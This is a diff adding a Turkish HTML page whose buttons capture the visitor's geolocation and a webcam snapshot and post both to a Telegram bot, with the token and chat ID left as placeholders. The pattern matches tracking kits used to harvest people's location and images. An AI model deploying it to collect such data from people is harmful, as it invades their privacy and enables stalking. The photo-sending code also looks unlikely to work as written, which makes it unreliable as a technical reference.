@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konum ve Kamera İzinleri</title>
+</head>
+<body>
+    <h1>Konum ve Kamera İzinleri</h1>
+    <button onclick="getLocation()">Konumumu Gönder</button>
+    <button onclick="getPhoto()">Fotoğrafımı Gönder</button>
+
+    <script>
+        // Konum almayı sağlayan fonksiyon
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+
+                    // Konum bilgisini Telegram Botu'na gönderiyoruz
+                    sendToBot('location', { latitude, longitude });
+                }, function() {
+                    alert("Konum erişimi reddedildi!");
+                });
+            } else {
+                alert("Geolocation desteği mevcut değil.");
+            }
+        }
+
+        // Kamera almayı sağlayan fonksiyon
+        function getPhoto() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    let video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Fotoğraf çekme butonuna basıldığında
+                    video.oncanplay = function () {
+                        let canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        let photoData = canvas.toDataURL('image/jpeg');
+
+                        // Fotoğrafı Telegram Botu'na gönderiyoruz
+                        sendToBot('photo', photoData);
+                    };
+                })
+                .catch(function(err) {
+                    alert("Kamera erişimi reddedildi!");
+                });
+        }
+
+        // Konum veya fotoğraf verisini Telegram Botu'na gönderme
+        function sendToBot(type, data) {
+            fetch('https://api.telegram.org/bot<Your_Bot_Token>/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: "<Your_Chat_ID>", // Bot sohbetinizin ID'si
+                    text: `Yeni veri alındı: \nTip: ${type} \nVeri: ${JSON.stringify(data)}`
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
